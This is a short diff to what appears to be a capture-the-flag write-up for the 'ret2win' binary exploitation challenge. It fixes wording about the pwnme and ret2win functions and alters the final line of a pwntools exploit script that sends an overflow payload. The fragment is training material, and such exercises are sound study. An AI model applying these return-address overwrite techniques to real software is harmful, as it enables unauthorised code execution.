@@ -21,8 +21,8 @@ objdump -t ret2win
 ```
 
 There are 2 interesting functions:
-- pwnme, which is called from main, which print some strings and get an input;
-- ret2win which perfom a system comand "cat flag.txt"
+- pwnme, which is called from main, print some strings and get an input;
+- ret2win perfom a system comand "cat flag.txt"
 
 ```
 pwndbg> disassemble ret2win 
@@ -88,5 +88,5 @@ pwndbg> cyclic -l 'iaaa'
  12 
  13 p.recvuntil('>')
  14 p.sendline(shellcode)
- 15 p.interactive()
+ 15 print(p.recvall())
 ```
